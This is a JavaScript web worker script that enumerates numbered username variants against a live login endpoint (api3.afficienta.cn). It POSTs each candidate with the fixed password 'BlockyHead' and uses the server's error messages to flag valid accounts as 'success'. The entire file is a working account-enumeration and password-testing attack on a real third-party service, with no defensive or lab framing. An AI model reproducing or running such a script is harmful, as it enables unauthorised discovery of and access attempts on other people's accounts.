self.onmessage = function(e) {
    threadTestUsername(e.data[0], e.data[1], e.data[2]);
}

async function threadTestUsername(originalUsername, min, max) {
    const url = "https://api3.afficienta.cn/datastore/login";
    for (var i = min; i <= max; i++) {
        var split = originalUsername.split(".")
        var username = split[0] + (i == 0 ? "" : i.toString()) + "." + split[1];
        try {
            var res = await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
                body: JSON.stringify({password: "BlockyHead", username: username})
            })

            var body = await res.text()
            self.postMessage(["tested", username])
            if (res.status == 200)
                i += 1;
            else
                continue;

            var parsed = JSON.parse(body);
            if (parsed.status == "fail" && parsed.message != "User not exist" && parsed.message != "User does not have permission to access the system") {
                self.postMessage(["success", username]);
            }

        }
        catch (ex) {
            continue;
        }
        
        
    }
}
